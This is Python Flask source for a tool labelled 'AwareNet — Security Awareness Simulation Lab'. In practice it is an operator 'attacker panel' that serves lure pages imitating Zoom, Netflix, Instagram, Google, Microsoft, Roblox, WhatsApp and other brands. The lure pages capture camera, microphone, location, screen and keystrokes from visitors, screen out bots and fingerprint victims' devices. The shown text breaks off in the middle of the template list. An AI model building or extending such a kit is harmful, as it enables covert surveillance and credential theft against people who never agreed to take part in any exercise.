# AwareNet — Security Awareness Simulation Lab
from flask import Flask, render_template, request, jsonify, send_from_directory, redirect, abort, session, Response
from flask_socketio import SocketIO, emit, join_room
from werkzeug.middleware.proxy_fix import ProxyFix
import os, base64, threading, time, uuid, secrets, json, re, random, string, io, csv, zipfile
from datetime import datetime
from urllib.request import urlopen




from modules.database import (
    init_db, t, get_db, get_all_campaigns, get_or_create_campaign,
    update_campaign, delete_campaign, get_all_targets, save_target,
    delete_target, increment_campaign_hits, increment_campaign_captures,
    add_event, get_recent_events, get_all_captures, save_capture,
    get_stats_summary, get_template_stats, update_target_first_click,
    update_target_notes, count_file_captures, analyze_password_strength, seed_default_email_templates,
    is_ip_banned, ban_ip, unban_ip, get_banned_ips, record_failed_login,
    get_webhook_configs, save_webhook_config,
    log_panel_access, get_panel_access_log,
    get_global_default, set_global_default, get_all_global_defaults,
    get_campaign_active_seconds, update_campaign_active_timer
)
from modules.email_sender import email_sender
from modules.sms_sender import sms_sender
from modules.anti_bot import is_bot, check_rate_limit
from modules.webhooks import webhook_notifier
from modules.license import (
    get_hwid, validate_key, save_key, load_key, is_licensed, is_expired, get_license_info,
    KEY_URL, LICENSE_SERVER_URL, get_platoboost_link, USE_PLATOBOOST
)

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_port=1)
app.config["SECRET_KEY"] = secrets.token_hex(24)
app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
app.config['PERMANENT_SESSION_LIFETIME'] = 3600
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
socketio = SocketIO(app, cors_allowed_origins="*")

AUTO_DELETE_SECONDS = None
ATTACKER_URL_TOKEN = os.environ.get("PANEL_TOKEN", "admin_panel")
ATTACKER_PASSWORD = os.environ.get("PANEL_PASSWORD", "")
if not ATTACKER_PASSWORD:
    ATTACKER_PASSWORD = "".join(str(secrets.randbelow(9) + 1) for _ in range(6))
CLEANUP_INTERVAL = 300
print(f"  \033[92mPanel password:\033[0m \033[97m{ATTACKER_PASSWORD}\033[0m")

# ── Licence check au démarrage ──
try:
    import sys as _sys_lic
    if not getattr(_sys_lic, 'frozen', False):
        print(f"  \033[92m[LICENCE]\033[0m Mode source — pas de clé requise (mot de passe terminal)")
    else:
        _lic = get_license_info()
        _kurl = _lic.get("key_url") or KEY_URL
        if _lic["valid"]:
            exp = _lic.get("expires_at") or "?"
            rem = _lic.get("remaining_hours") or "?"
            print(f"  \033[92m[LICENCE]\033[0m OK — HWID {_lic['hwid']} | key {_lic['key'][:11]}*** | expire {exp} ({rem}h)")
            if USE_PLATOBOOST:
                print(f"            Platoboost service 30939 actif")
        else:
            if _lic.get("expired"):
                print(f"  \033[91m[LICENCE]\033[0m Expirée — HWID {_lic['hwid']} | Obtenir nouvelle clé: {_kurl}")
            else:
                print(f"  \033[93m[LICENCE]\033[0m Non activé — HWID {_lic['hwid']} | Obtenir une clé: {_kurl}")
            print(f"            Lance /license dans le navigateur ou définis AWARNET_LICENSE_KEY")
except Exception as _e:
    print(f"  [LICENCE] check skip: {_e}")

def _get_resources_dir_app():
    import sys
    if getattr(sys, 'frozen', False):
        base = os.path.dirname(os.path.abspath(sys.executable))
    else:
        base = os.path.dirname(os.path.abspath(__file__)) if os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.py")) else "."
        # si pas frozen, base est le dossier du projet
        base = os.path.dirname(os.path.abspath(__file__)) if os.path.exists(os.path.join(os.path.dirname(os.path.abspath(__file__)), "app.py")) else "."
        base = os.path.abspath(".")
    res = os.path.join(base, "awarenet ressources")
    try:
        os.makedirs(res, exist_ok=True)
    except Exception:
        pass
    return res

RESOURCES_DIR = _get_resources_dir_app()
def rpath(*parts):
    return os.path.join(RESOURCES_DIR, *parts)

def _legacy_path(*parts):
    """Chemin legacy à côté du .py / .exe (compat avant awarenet ressources)"""
    return os.path.join(*parts)

def _find_existing_dir(*parts):
    """Retourne rpath si existe sinon legacy si existe sinon rpath (pour lecture avec fallback)"""
    rp = rpath(*parts)
    if os.path.isdir(rp):
        return rp
    lp = _legacy_path(*parts)
    if os.path.isdir(lp):
        return lp
    return rp

def _find_existing_file(*parts):
    rp = rpath(*parts)
    if os.path.exists(rp):
        return rp
    lp = _legacy_path(*parts)
    if os.path.exists(lp):
        return lp
    # cherche aussi dans _MEIPASS pour audios/videos bundlés
    try:
        import sys as _sys2
        if getattr(_sys2, 'frozen', False) and hasattr(_sys2, '_MEIPASS'):
            mp = os.path.join(_sys2._MEIPASS, *parts)
            if os.path.exists(mp):
                return mp
    except Exception:
        pass
    return rp

os.makedirs(rpath("uploads"), exist_ok=True)
os.makedirs(rpath("reports"), exist_ok=True)
os.makedirs(rpath("campaign_media"), exist_ok=True)
os.makedirs(rpath("campaign_audios"), exist_ok=True)
os.makedirs(rpath("campaign_videos"), exist_ok=True)
os.makedirs(rpath("downloads"), exist_ok=True)
os.makedirs(rpath("custom_templates"), exist_ok=True)

# Migration automatique des anciens dossiers à la racine vers awarenet ressources (une seule fois)
def _migrate_legacy_resources():
    for name in ("uploads", "downloads", "campaign_audios", "campaign_videos", "reports"):
        try:
            legacy = name
            target = rpath(name)
            if os.path.isdir(legacy) and os.path.isdir(target):
                # si legacy contient des fichiers et target vide -> copie
                # sinon copie les fichiers manquants
                import shutil
                if not os.listdir(target) and os.listdir(legacy):
                    for item in os.listdir(legacy):
                        s = os.path.join(legacy, item)
                        d = os.path.join(target, item)
                        if not os.path.exists(d):
                            try:
                                if os.path.isdir(s):
                                    shutil.copytree(s, d)
                                else:
                                    shutil.copy2(s, d)
                            except Exception:
                                pass
                    log_event("info", f"Migrated legacy '{name}' -> awarenet ressources/{name}/") if 'log_event' in globals() else None
        except Exception:
            pass

# La migration sera appelée après définition de log_event / init_db si nécessaire, on le fera aussi au boot

events = []
targets = {}
campaigns = {}
custom_templates_data = {}
rate_limit_cache = {}
geoip_cache = {}
geoip_cache_ttl = 86400

init_db()

def sanitize_html(html):
    html = re.sub(r'<script[^>]*?>.*?</script>', '', html, flags=re.DOTALL|re.IGNORECASE)
    html = re.sub(r'\son\w+\s*=\s*["\'][^"\']*["\']', '', html, flags=re.IGNORECASE)
    html = re.sub(r'href\s*=\s*["\']\s*javascript\s*:', '', html, flags=re.IGNORECASE)
    html = re.sub(r'<iframe[^>]*?>.*?</iframe>', '', html, flags=re.DOTALL|re.IGNORECASE)
    html = re.sub(r'<object[^>]*?>.*?</object>', '', html, flags=re.DOTALL|re.IGNORECASE)
    html = re.sub(r'<embed[^>]*?>.*?</embed>', '', html, flags=re.DOTALL|re.IGNORECASE)
    return html

def load_custom_templates():
    global custom_templates_data
    custom_templates_data = {}
    # Dossier principal: awarenet ressources/custom_templates (à côté de l'exe en mode frozen)
    # Compat: aussi "custom_templates" à la racine + _MEIPASS si bundlé
    import sys as _sys
    candidates = []
    primary = rpath("custom_templates")
    candidates.append(primary)
    try:
        os.makedirs(primary, exist_ok=True)
    except Exception:
        pass
    # Legacy à la racine (dev ou ancien exe)
    legacy = os.path.join(os.path.dirname(os.path.abspath(__file__)) if not getattr(_sys, 'frozen', False) else os.path.dirname(os.path.abspath(_sys.executable)), "custom_templates")
    # Aussi cwd/custom_templates pour compat totale
    for p in [legacy, "custom_templates"]:
        if p not in candidates:
            candidates.append(p)
    # Si bundlé via PyInstaller datas -> _MEIPASS
    if getattr(_sys, 'frozen', False) and hasattr(_sys, '_MEIPASS'):
        meipass_tpl = os.path.join(_sys._MEIPASS, "custom_templates")
        if meipass_tpl not in candidates:
            candidates.append(meipass_tpl)
    # Migration automatique: si legacy contient des templates mais primary est vide, copie
    try:
        if os.path.isdir(legacy) and os.path.isdir(primary):
            legacy_items = [d for d in os.listdir(legacy) if os.path.isdir(os.path.join(legacy, d)) and os.path.exists(os.path.join(legacy, d, "config.json"))]
            primary_items = [d for d in os.listdir(primary) if os.path.isdir(os.path.join(primary, d))]
            if legacy_items and not primary_items:
                import shutil
                for item in legacy_items:
                    src = os.path.join(legacy, item)
                    dst = os.path.join(primary, item)
                    if not os.path.exists(dst):
                        try:
                            shutil.copytree(src, dst)
                            log_event("info", f"Migrated custom_template '{item}' -> awarenet ressources/custom_templates/")
                        except Exception:
                            pass
    except Exception:
        pass
    # Charge en fusionnant les candidats (primary prioritaire)
    for base_dir in candidates:
        if not os.path.exists(base_dir) or not os.path.isdir(base_dir):
            continue
        try:
            for item in os.listdir(base_dir):
                if item in custom_templates_data:
                    continue  # déjà chargé depuis un candidat prioritaire
                template_dir = os.path.join(base_dir, item)
                if os.path.isdir(template_dir):
                    config_path = os.path.join(template_dir, "config.json")
                    if os.path.exists(config_path):
                        try:
                            with open(config_path, "r", encoding="utf-8") as f:
                                config = json.load(f)
                            html_path = os.path.join(template_dir, "template.html")
                            css_path = os.path.join(template_dir, "style.css")
                            js_path = os.path.join(template_dir, "script.js")
                            html_content = ""
                            if os.path.exists(html_path):
                                with open(html_path, "r", encoding="utf-8") as hf: html_content = sanitize_html(hf.read())
                            css_content = ""
                            if os.path.exists(css_path):
                                with open(css_path, "r", encoding="utf-8") as cf: css_content = cf.read()
                            js_content = ""
                            if os.path.exists(js_path):
                                with open(js_path, "r", encoding="utf-8") as jf: js_content = jf.read()
                            custom_templates_data[item] = {
                                "config": config, "html": html_content,
                                "css": css_content, "js": js_content
                            }
                        except Exception as e:
                            log_event("error", f"Failed to load template '{item}' from {base_dir}: {e}")
        except Exception:
            continue

def load_campaigns():
    global campaigns
    try:
        db_camps = get_all_campaigns()
        campaigns = {c["slug"]: c for c in db_camps}
    except Exception:
        pass

def log_event(kind, detail, slug=""):
    entry = {"time": datetime.now().strftime("%H:%M:%S"), "kind": kind, "detail": detail, "campaign": slug}
    events.append(entry)
    if len(events) > 500:
        events[:] = events[-300:]
    add_event(kind, detail, slug)
    colored_detail = re.sub(r'\[([^\]]+)\]', r'\033[92m[\1]\033[0m', detail)
    print(f"  \033[91m[{entry['time']}]\033[0m \033[92m[{kind.upper().ljust(10)}]\033[0m {colored_detail}")
    try:
        socketio.emit("log_update", entry, room="attacker")
    except Exception:
        pass

def auto_delete():
    while True:
        time.sleep(15)
        try:
            conn = get_db()
            now = datetime.now()
            rows = conn.execute("SELECT * FROM campaigns WHERE status='active' AND auto_delete=1").fetchall()
            for row in rows:
                c = dict(row)
                try:
                    created = datetime.strptime(c["created_at"], "%H:%M:%S %d/%m/%y")
                    elapsed = (now - created).total_seconds()
                except Exception:
                    continue
                if elapsed >= c["auto_delete_seconds"]:
                    try:
                        slug = c["slug"]
                        delete_campaign(slug)
                        campaigns.pop(slug, None)
                        socketio.emit("campaign_deleted", {"slug": slug}, room="attacker")
                        log_event("campaign", f"Auto-deleted: '{c['name']}' (expired after {c['auto_delete_seconds']}s)")
                    except Exception:
                        pass
        except Exception:
            pass
        try:
            conn = get_db()
            now = datetime.now()
            rows = conn.execute("SELECT * FROM campaigns WHERE status='waiting' AND auto_start=1").fetchall()
            for row in rows:
                c = dict(row)
                try:
                    created = datetime.strptime(c["created_at"], "%H:%M:%S %d/%m/%y")
                    elapsed = (now - created).total_seconds()
                except Exception:
                    continue
                if elapsed >= c["auto_start_delay"]:
                    try:
                        slug = c["slug"]
                        update_campaign(slug, {"status": "active"})
                        c2 = get_or_create_campaign(slug)
                        if c2:
                            campaigns[slug] = c2
                            socketio.emit("campaign_updated", c2, room="attacker")
                        log_event("campaign", f"Auto-started: '{c['name']}' (delay of {c['auto_start_delay']}s elapsed)")
                    except Exception:
                        pass
        except Exception:
            pass
        try:
            now_ts = time.time()
            stale_threshold = now_ts - 7200
            stale_sids = [sid for sid, t in list(targets.items()) if t.get("_last_seen", now_ts) < stale_threshold]
            for sid in stale_sids:
                t = targets.pop(sid, None)
                if t:
                    log_event("cleanup", f"Stale target removed: {t.get('alias', '?')} (inactive >2h)", t.get("slug", ""))
                    socketio.emit("target_left", {"sid": sid, "alias": t.get("alias", "?")}, room="attacker")
        except Exception:
            pass

def valid_slug(slug):
    return bool(re.match(r'^[a-zA-Z0-9_-]{3,60}$', slug))

def safe_name(value, fallback="unknown"):
    cleaned = re.sub(r"[^a-zA-Z0-9_-]", "-", str(value or ""))
    cleaned = re.sub(r"-{2,}", "-", cleaned).strip("-_")
    return (cleaned[:40] or fallback)

def parse_user_agent(ua):
    info = {"device_type": "Unknown", "os": "Unknown", "os_version": "", "browser": "Unknown", "browser_version": ""}
    ua_lower = ua.lower()
    # Device type
    if "bot" in ua_lower or "crawler" in ua_lower or "spider" in ua_lower or "curl" in ua_lower or "wget" in ua_lower:
        info["device_type"] = "Bot/Crawler"
    elif "tablet" in ua_lower or "ipad" in ua_lower or "tab" in ua_lower:
        info["device_type"] = "Tablet"
    elif "mobile" in ua_lower or "iphone" in ua_lower or "ipod" in ua_lower or "android" in ua_lower and "mobile" in ua_lower:
        info["device_type"] = "Mobile"
    elif "windows" in ua_lower or "macintosh" in ua_lower or "linux" in ua_lower or "cros" in ua_lower:
        info["device_type"] = "PC"
    # OS
    if "windows nt 10.0" in ua_lower:
        info["os"] = "Windows 10/11"
    elif "windows nt 6.3" in ua_lower:
        info["os"] = "Windows 8.1"
    elif "windows nt 6.2" in ua_lower:
        info["os"] = "Windows 8"
    elif "windows nt 6.1" in ua_lower:
        info["os"] = "Windows 7"
    elif "windows nt 6.0" in ua_lower:
        info["os"] = "Windows Vista"
    elif "windows nt 5.1" in ua_lower:
        info["os"] = "Windows XP"
    elif "windows nt 5.0" in ua_lower:
        info["os"] = "Windows 2000"
    elif "windows phone" in ua_lower:
        info["os"] = "Windows Phone"
    elif "macintosh" in ua_lower or "mac os x" in ua_lower:
        info["os"] = "macOS"
        m = re.search(r"mac os x (\d+[._]\d+[._]?\d*)", ua_lower)
        if m:
            info["os_version"] = m.group(1).replace("_", ".")
    elif "iphone" in ua_lower or "ipad" in ua_lower or "ipod" in ua_lower:
        info["os"] = "iOS"
        m = re.search(r"os (\d+[._]\d+[._]?\d*)", ua_lower)
        if m:
            info["os_version"] = m.group(1).replace("_", ".")
    elif "android" in ua_lower:
        info["os"] = "Android"
        m = re.search(r"android (\d+[.]\d+[.]?\d*)", ua_lower)
        if m:
            info["os_version"] = m.group(1)
    elif "linux" in ua_lower:
        info["os"] = "Linux"
    elif "cros" in ua_lower:
        info["os"] = "ChromeOS"
    # Browser
    if "edg/" in ua_lower or "edge/" in ua_lower:
        info["browser"] = "Edge"
        m = re.search(r"edg/([\d.]+)", ua_lower) or re.search(r"edge/([\d.]+)", ua_lower)
        if m: info["browser_version"] = m.group(1)
    elif "opr/" in ua_lower or "opera/" in ua_lower:
        info["browser"] = "Opera"
        m = re.search(r"opr/([\d.]+)", ua_lower) or re.search(r"opera/([\d.]+)", ua_lower)
        if m: info["browser_version"] = m.group(1)
    elif "chrome/" in ua_lower and "edg/" not in ua_lower and "opr/" not in ua_lower:
        info["browser"] = "Chrome"
        m = re.search(r"chrome/([\d.]+)", ua_lower)
        if m: info["browser_version"] = m.group(1)
    elif "firefox/" in ua_lower or "fxios/" in ua_lower:
        info["browser"] = "Firefox"
        m = re.search(r"firefox/([\d.]+)", ua_lower) or re.search(r"fxios/([\d.]+)", ua_lower)
        if m: info["browser_version"] = m.group(1)
    elif "safari" in ua_lower and "chrome/" not in ua_lower:
        info["browser"] = "Safari"
        m = re.search(r"version/([\d.]+)", ua_lower)
        if m: info["browser_version"] = m.group(1)
    return info

def save_device_info(sid):
    try:
        t = targets.get(sid)
        if not t:
            return
        alias = t.get("alias", "unknown")
        safe_alias = safe_name(alias)
        target_dir = rpath("uploads", safe_alias)
        os.makedirs(target_dir, exist_ok=True)
        ua = t.get("user_agent", "")
        info = parse_user_agent(ua)
        lines = [
            f"Device: {info['device_type']}",
            f"OS: {info['os']} {info['os_version']}".strip(),
            f"Browser: {info['browser']} {info['browser_version']}".strip(),
            f"IP: {t.get('ip', 'Unknown')}",
            f"User-Agent: {ua}",
        ]
        with open(os.path.join(target_dir, "device_info.txt"), "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
    except Exception:
        pass

def client_ip():
    hdr = request.headers.get("X-Forwarded-For", "")
    if hdr:
        ip = hdr.split(",")[0].strip()
        if ip and ip.lower() != "unknown":
            return ip.replace("::ffff:", "")
    for key in ("X-Real-IP", "CF-Connecting-IP"):
        ip = request.headers.get(key, "").strip()
        if ip:
            return ip.replace("::ffff:", "")
    env = getattr(request, "environ", {}) or {}
    for key in ("HTTP_X_FORWARDED_FOR", "HTTP_X_REAL_IP", "HTTP_CF_CONNECTING_IP", "REMOTE_ADDR"):
        raw = str(env.get(key, "")).strip()
        if raw:
            ip = raw.split(",")[0].strip()
            if ip and ip.lower() != "unknown":
                return ip.replace("::ffff:", "")
    return (request.remote_addr or "").replace("::ffff:", "") or "unknown"

def attacker_required():
    ip = client_ip()
    if is_ip_banned(ip):
        log_event("antibot", f"Banned IP attempted access: {ip}")
        abort(403)
    token = request.headers.get("X-Attacker-Token") or request.args.get("X-Attacker-Token", "")
    if token != ATTACKER_URL_TOKEN:
        log_event("error", f"Auth failed: {token} != {ATTACKER_URL_TOKEN}")
        abort(403)

# ── Licence — mur global ───────────────────────────────────────────────
# Bypass pour dev: AWARNET_NO_LICENSE=1
# Routes exemptées: /license, /api/license/*, /static/*, /api/status (pour healthcheck)
LICENSE_EXEMPT_PREFIXES = ("/license", "/api/license", "/static/", "/api/status", "/favicon.ico")

@app.before_request
def _license_wall():
    # Mode source (python app.py) → pas de clé, juste mot de passe terminal
    # Mode .exe (frozen) → clé Platoboost obligatoire
    import sys as _sys
    if not getattr(_sys, 'frozen', False):
        return None
    if os.environ.get("AWARNET_NO_LICENSE") == "1":
        return None
    path = request.path or "/"
    # exempt exact/prefix
    for p in LICENSE_EXEMPT_PREFIXES:
        if path == p or path.startswith(p):
            return None
    # autorise aussi /license sans slash
    if path == "/license" or path.startswith("/license"):
        return None
    # Option: laisser les pages victimes publiques sans licence (décommente si tu veux)
    # if re.match(r"^/[a-zA-Z0-9_-]{3,60}(/.*)?$", path) and not path.startswith("/panel") and not path.startswith("/api/"):
    #     return None
    if not is_licensed():
        from modules.license import is_expired
        expired = is_expired()
        # key_url dynamique Platoboost si activé
        try:
            kurl = get_platoboost_link()
        except Exception:
            kurl = KEY_URL
        if path.startswith("/api/") or request.headers.get("X-Requested-With") == "XMLHttpRequest":
            if expired:
                return jsonify({"error": "license_expired", "key_url": kurl, "hwid": get_hwid(), "duration_hours": get_license_info().get("duration_hours", 24)}), 403
            return jsonify({"error": "license_required", "key_url": kurl, "hwid": get_hwid()}), 403
        if expired:
            return redirect("/license?expired=1")
        return redirect("/license")


# ── Licence routes ──────────────────────────────────────────────────────
@app.route("/license", methods=["GET", "POST"])
def license_page():
    info = get_license_info()
    # key_url dynamique Platoboost
    try:
        kurl = get_platoboost_link()
    except Exception:
        kurl = info.get("key_url") or KEY_URL
    expired_flag = request.args.get("expired") == "1" or info.get("expired")
    if request.method == "POST":
        key = ""
        if request.is_json:
            try:
                raw = (request.json or {}).get("key", "").strip()
                if raw.lower().startswith("free_") or raw.lower().startswith("key_"):
                    key = raw.strip()
                else:
                    key = raw.strip().upper()
            except Exception:
                key = ""
        else:
            raw = (request.form.get("key") or "").strip()
            if raw.lower().startswith("free_") or raw.lower().startswith("key_"):
                key = raw.strip()
            else:
                key = raw.strip().upper()
        if not key:
            return render_template("license.html", hwid=info["hwid"], key_url=kurl, server_url=LICENSE_SERVER_URL, error="Colle ta clé (Platoboost KEY_... / FREE_...)", key="", info=info, expired=expired_flag)
        ok, reason = validate_key(key)
        if ok:
            try:
                save_key(key)
                info2 = get_license_info()
                log_event("license", f"Licence activée: {key[:11]}*** (HWID {info['hwid']}) via {reason} expires {info2.get('expires_at')}")
            except Exception as e:
                return render_template("license.html", hwid=info["hwid"], key_url=kurl, server_url=LICENSE_SERVER_URL, error=f"Clé valide mais sauvegarde échouée: {e}", key=key, info=info, expired=expired_flag)
            if request.is_json:
                return jsonify({"status": "activated", "hwid": info["hwid"], "expires_at": get_license_info().get("expires_at"), "duration_hours": get_license_info().get("duration_hours"), "via": reason})
            return redirect(f"/panel/{ATTACKER_URL_TOKEN}")
        else:
            msg = "Clé invalide"
            if "hors_connexion" in reason:
                msg = "Hors connexion — vérifiez votre connexion internet pour valider la clé Platoboost."
            elif "platoboost" in reason or "KEY_" in key:
                msg = f"Platoboost: {reason}. Vérifie que tu as bien passé le Linkvertise et copié la clé KEY_... complète."
            elif reason == "server_error":
                msg = "Erreur serveur de licence — réessaie ou vérifie ta connexion"
            elif reason == "invalid":
                msg = f"Clé invalide pour ce HWID ({info['hwid']})."
            elif reason.startswith("server_error"):
                msg = f"Serveur injoignable: {reason}"
            else:
                msg = f"Clé invalide ({reason})"
            if request.is_json:
                return jsonify({"error": msg, "reason": reason, "hwid": info["hwid"]}), 403
            return render_template("license.html", hwid=info["hwid"], key_url=kurl, server_url=LICENSE_SERVER_URL, error=msg, key=key, info=info, expired=expired_flag)
    # GET
    if info["valid"]:
        return render_template("license.html", hwid=info["hwid"], key_url=kurl, server_url=LICENSE_SERVER_URL, success=f"Activé ✓ — Expire {info.get('expires_at')} ({info.get('remaining_hours')}h restantes) via {info.get('reason')}", key=info["key"], info=info, expired=False)
    if expired_flag and info.get("key"):
        return render_template("license.html", hwid=info["hwid"], key_url=kurl, server_url=LICENSE_SERVER_URL, error=f"Licence expirée après {info.get('duration_hours',24)}h. Récupère une nouvelle clé Platoboost pour réactiver 24h.", key="", info=info, expired=True)
    return render_template("license.html", hwid=info["hwid"], key_url=kurl, server_url=LICENSE_SERVER_URL, error=None, success=None, key="", info=info, expired=expired_flag)

@app.route("/api/license/status", methods=["GET"])
def api_license_status():
    return jsonify(get_license_info())

@app.route("/api/license/activate", methods=["POST"])
def api_license_activate():
    data = request.json or {}
    raw = (data.get("key") or request.form.get("key") or "").strip()
    if raw.lower().startswith("free_") or raw.lower().startswith("key_"):
        key = raw.strip()
    else:
        key = raw.strip().upper()
    if not key:
        return jsonify({"error": "missing key"}), 400
    ok, reason = validate_key(key)
    if not ok:
        try:
            kurl = get_platoboost_link()
        except Exception:
            kurl = KEY_URL
        return jsonify({"error": "invalid", "reason": reason, "hwid": get_hwid(), "key_url": kurl}), 403
    save_key(key)
    info = get_license_info()
    log_event("license", f"Licence activée via API: {key[:11]}*** via {reason} expires {info.get('expires_at')}")
    return jsonify({"status": "activated", "hwid": get_hwid(), "expires_at": info.get("expires_at"), "via": reason})

@app.route("/api/license/hwid", methods=["GET"])
def api_license_hwid():
    try:
        kurl = get_platoboost_link()
    except Exception:
        kurl = KEY_URL
    return jsonify({"hwid": get_hwid(), "key_url": kurl, "platoboost": USE_PLATOBOOST})

@app.route("/api/license/link", methods=["GET"])
def api_license_link():
    """Retourne le lien Platoboost dynamique (pour AJAX)."""
    try:
        kurl = get_platoboost_link()
    except Exception as e:
        kurl = KEY_URL
        return jsonify({"key_url": kurl, "error": str(e)}), 500
    return jsonify({"key_url": kurl, "hwid": get_hwid()})

# ── Attacker panel ──
@app.route("/panel/<token>", methods=["GET", "POST"])
def attacker(token):
    global ATTACKER_PASSWORD
    if token != ATTACKER_URL_TOKEN:
        abort(404)
    ip = client_ip()
    ua = request.headers.get("User-Agent", "")
    log_panel_access(ip, ua, request.path, 0)
    if is_ip_banned(ip):
        return render_template("attacker_login.html", error="IP banned", token=token), 403
    if session.get("attacker_auth") == token:
        session.permanent = True
        log_panel_access(ip, ua, request.path, 1)
        return render_template("attacker.html", token=token)
    if request.method == "POST":
        if request.form.get("password", "") == ATTACKER_PASSWORD:
            session.permanent = True
            session["attacker_auth"] = token
            log_panel_access(ip, ua, request.path, 1)
            return redirect(f"/panel/{token}")
        attempts = record_failed_login(ip)
        if attempts >= 5:
            ban_ip(ip, "Too many failed login attempts")
            log_event("antibot", f"IP banned after {attempts} failed attempts: {ip}")
        return render_template("attacker_login.html", error="Incorrect password", token=token)
    return render_template("attacker_login.html", error=None, token=token)

@app.route("/panel/<token>/logout")
def attacker_logout(token):
    if token != ATTACKER_URL_TOKEN:
        abort(404)
    session.pop("attacker_auth", None)
    return redirect(f"/panel/{token}")

@app.route("/custom-template-js/<name>")
def serve_custom_js(name):
    ct = custom_templates_data.get(name)
    if not ct or not ct["js"]:
        abort(404)
    return Response(ct["js"], mimetype="application/javascript",
                    headers={"Content-Security-Policy": "script-src 'self'",
                             "X-Content-Type-Options": "nosniff"})

# ── Pretext page ──
@app.route("/pretext/<slug>")
def pretext_page(slug):
    c = get_or_create_campaign(slug)
    if not c or c["status"] != "active":
        abort(404)
    lang = c.get("lang", "en")
    return render_template("pretext.html", slug=slug, campaign_name=c["name"],
                           puburl=c.get("puburl", ""), lang=lang,
                           redirect_url=c.get("redirect_url", ""))

# ── Campaign target page ──
@app.route("/<slug>")
def join_campaign(slug):
    c = get_or_create_campaign(slug)
    if not c or c["status"] != "active":
        abort(404)

    ip = client_ip()
    ua = request.headers.get("User-Agent", "")
    bot_detected, bot_reason = is_bot(request)
    if bot_detected:
        log_event("antibot", f"Bot blocked: {bot_reason} on /{slug}", slug)
        return jsonify({"status": "blocked", "reason": "security_check"}), 403

    if check_rate_limit(ip, rate_limit_cache, limit=30, window=10):
        log_event("antibot", f"Rate limit exceeded from {ip}", slug)
        return jsonify({"status": "blocked", "reason": "rate_limit"}), 429

    increment_campaign_hits(slug)
    c = get_or_create_campaign(slug)
    socketio.emit("campaign_hit", {"slug": slug, "hits": c["hits"]}, room="attacker")

    show_pretext = c.get("show_pretext", False)
    skip_pretext = request.args.get("skip_pretext", "0") == "1"
    lang = c.get("lang", "en")

    if show_pretext and not skip_pretext:
        return render_template("pretext.html", slug=slug, campaign_name=c["name"],
                               puburl=c.get("puburl", ""), lang=lang,
                               redirect_url=request.url)

    try:
        perms = json.loads(c.get("permissions", '["camera","microphone","location","screen","keylogger"]'))
    except Exception:
        perms = ["camera", "microphone", "location", "screen", "keylogger"]

    custom_template = custom_templates_data.get(c["template"])
    trans = {}
    for key in ("join_meeting", "verify_account", "sign_in", "camera_required",
                 "enable_camera", "connecting", "redirecting", "training_title",
                 "training_desc", "training_tip1", "training_tip2", "training_tip3",
                 "training_tip4", "training_btn", "audio_recording", "video_recording"):
        trans[key] = t(lang, key)
    # audio/video for victim playback
    try:
        audio_files = json.loads(c.get("audio_files", "[]") or "[]")
    except Exception:
        audio_files = []
    video_file = c.get("video_file", "") or ""
    video_enabled = bool(c.get("video_enabled", False))
    video_repeat = bool(c.get("video_repeat", False))
    audio_enabled = bool(c.get("audio_enabled", False))
    return render_template("target.html",
                           template=c["template"], slug=slug,
                           campaign_name=c["name"],
                           puburl=c.get("puburl", ""),
                           ngrok=c.get("puburl", ""),
                           screen_recording="screen" in perms,
                           precise_location="location" in perms,
                           camera_enabled="camera" in perms,
                           microphone_enabled="microphone" in perms,
                           keylogger_enabled="keylogger" in perms,
                            redirect_after_capture=bool(c.get("redirect_after_capture", False)),
                            redirect_url=c.get("redirect_url", ""),
                             chat_mode=bool(c.get("chat_mode", False)),
                             photo_quality=c.get("photo_quality", "480"),
                             video_quality=c.get("video_quality", "480"),
                             liveview_quality=c.get("liveview_quality", "low"),
                             training_mode=bool(c.get("training_mode", False)),
                             download_in_page=bool(c.get("download_in_page", False)),
                             download_file_name=c.get("download_file_name", ""),
                             custom_template=custom_template,
                             lang=lang, trans=trans,
                             audio_enabled=audio_enabled,
                             audio_files=audio_files,
                             video_enabled=video_enabled,
                             video_file=video_file,
                             video_repeat=video_repeat)

# ── SMTP config page ──
@app.route("/panel/<token>/email")
def email_config_page(token):
    if token != ATTACKER_URL_TOKEN:
        abort(404)
    if session.get("attacker_auth") != token:
        return redirect(f"/panel/{token}")
    return render_template("email_config.html", token=token)

# ── API: Status ──
@app.route("/api/status")
def api_status():
    return jsonify({"status": "running", "token": ATTACKER_URL_TOKEN})

# ── API: Stats ──
@app.route("/api/stats")
def api_stats():
    attacker_required()
    return jsonify(get_stats_summary())

# ── API: Campaign stats (advanced) ──
@app.route("/api/campaigns/<slug>/stats")
def api_campaign_stats(slug):
    attacker_required()
    stats = get_template_stats(slug)
    if not stats:
        return jsonify({"error": "Not found"}), 404
    return jsonify(stats)

# ── API: Templates ──
@app.route("/api/templates", methods=["GET"])
def api_get_templates():
    attacker_required()
    builtin = [
        {"id": "zoom", "name": "Zoom"},
        {"id": "zoom_ped", "name": "Zoom PED"},
        {"id": "netflix", "name": "Netflix"},
        {"id": "instagram", "name": "Instagram"},
        {"id": "teams", "name": "Microsoft Teams"},
        {"id": "google", "name": "Google"},
        {"id": "discord", "name": "Discord"},
        {"id": "tiktok", "name": "TikTok"},
        {"id": "roblox", "name": "Roblox"},
        {"id": "whatsapp", "name": "WhatsApp"},
        {"id": "linkedin", "name": "LinkedIn"},
        {"id": "facebook", "name": "Facebook"},
        {"id": "twitter", "name": "Twitter"},
        {"id": "adobe", "name": "Adobe"},
        {"id": "badoo", "name": "Badoo"},
        {"id": "deviantart", "name": "DeviantArt"},
        {"id": "dropbox", "name": "Dropbox"},
        {"id": "ebay", "name": "eBay"},
        {"id": "fb_advanced", "name": "Facebook Advanced"},
        {"id": "fb_messenger", "name": "Facebook Messenger"},
        {"id": "fb_security", "name": "Facebook Security"},
        {"id": "github", "name": "GitHub"},
        {"id": "gitlab", "name": "GitLab"},
        {"id": "google_new", "name": "Google New"},
        {"id": "google_poll", "name": "Google Poll"},
        {"id": "ig_followers", "name": "IG Followers"},
        {"id": "ig_verify", "name": "IG Verify"},
        {"id": "insta_followers", "name": "Insta Followers"},
        {"id": "mediafire", "name": "MediaFire"},
        {"id": "microsoft", "name": "Microsoft"},
        {"id": "origin", "name": "Origin"},
